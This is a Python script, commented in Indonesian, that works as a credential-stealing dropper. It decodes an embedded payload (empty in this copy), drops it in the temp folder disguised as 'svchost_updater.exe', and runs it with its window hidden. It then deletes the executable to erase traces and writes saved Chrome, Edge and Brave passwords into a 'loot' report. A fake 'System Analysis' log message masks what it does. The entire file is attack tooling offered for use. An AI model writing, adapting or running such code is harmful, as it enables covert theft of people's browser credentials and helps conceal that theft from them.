import os
import base64
import subprocess
import json
import time
import shutil
import tempfile
from datetime import datetime

# --- PAYLOAD (Chromelevator x64) ---
# Disembunyikan dalam variabel string
PAYLOAD_B64 = ""

def drop_and_execute_payload():
    # 1. Tentukan lokasi drop (Folder Temp agar tidak terlihat)
    temp_dir = tempfile.gettempdir()
    dropped_exe = os.path.join(temp_dir, "svchost_updater.exe") # Nama palsu
    output_dir = os.path.join(temp_dir, "chrome_dump_output")
    
    print(f"[*] System Analysis initiated...") # Fake log
    
    # 2. Decode dan Tulis File EXE
    try:
        with open(dropped_exe, "wb") as f:
            f.write(base64.b64decode(PAYLOAD_B64))
    except Exception as e:
        print(f"[!] Log Error: {e}")
        return None

    # 3. Eksekusi
    # Command: exe all --kill --output-path "..."
    cmd = [dropped_exe, "all", "--kill", "--output-path", output_dir]
    
    try:
        # Gunakan subprocess dengan creationflags agar window tidak muncul (jika di Windows)
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        
        proc = subprocess.run(cmd, capture_output=True, text=True, startupinfo=startupinfo)
        
        if proc.returncode != 0:
            # print(proc.stderr) # Debug only
            pass
            
    except Exception as e:
        print(f"[!] Execution Error: {e}")
    
    # 4. Hapus EXE (Cleanup Jejak) segera
    try:
        os.remove(dropped_exe)
    except: pass
    
    return output_dir

def parse_loot(output_dir, report_file):
    if not output_dir or not os.path.exists(output_dir):
        return

    print("[*] Processing data...")
    browsers = ["Chrome", "Edge", "Brave"]
    
    with open(report_file, "a", encoding="utf-8") as f:
        for browser in browsers:
            b_path = os.path.join(output_dir, browser)
            if not os.path.exists(b_path): continue
            
            for profile in os.listdir(b_path):
                p_path = os.path.join(b_path, profile)
                if not os.path.isdir(p_path): continue
                
                # Passwords
                pass_file = os.path.join(p_path, "passwords.json")
                if os.path.exists(pass_file):
                    try:
                        data = json.load(open(pass_file, "r", encoding="utf-8"))
                        f.write(f"\n=== {browser} | {profile} ===\n")
                        for item in data:
                            f.write(f"Url: {item.get('url')}\nUser: {item.get('user')}\nPassword: {item.get('pass')}\n---\n")
                    except: pass

    # Cleanup Output Folder
    try:
        shutil.rmtree(output_dir)
    except: pass

def main():
    report_name = f"loot_{int(time.time())}.txt"
    
    # Header Report
    with open(report_name, "w") as f:
        f.write(f"REPORT GENERATED: {datetime.now()}\n")
        f.write("="*40 + "\n")

    # Execute Hybrid Attack
    loot_dir = drop_and_execute_payload()
    
    # Parse Result
    parse_loot(loot_dir, report_name)
    
    print(f"[+] Process Completed. Output: {report_name}")

if __name__ == "__main__":
    main()
